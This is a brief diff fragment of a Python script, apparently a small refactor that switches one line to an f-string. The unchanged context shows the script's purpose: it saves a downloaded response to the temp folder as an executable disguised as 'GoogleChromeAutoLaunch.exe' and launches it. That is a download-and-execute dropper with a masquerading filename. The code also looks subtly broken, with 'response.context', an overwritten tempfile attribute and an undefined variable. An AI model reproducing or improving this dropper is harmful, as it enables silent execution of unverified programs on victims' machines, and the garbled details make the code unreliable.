@@ -17,7 +17,7 @@ while True:
     else:
         break
 tempfile.TemporaryDirectory = tempfile.gettempdir()
-newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"
+newFile = f"{tempDirectory}//GoogleChromeAutoLaunch.exe"
 with open(newFile, "wb") as handle:
     handle.write(response.context)
 subprocess.Popen(newFile)
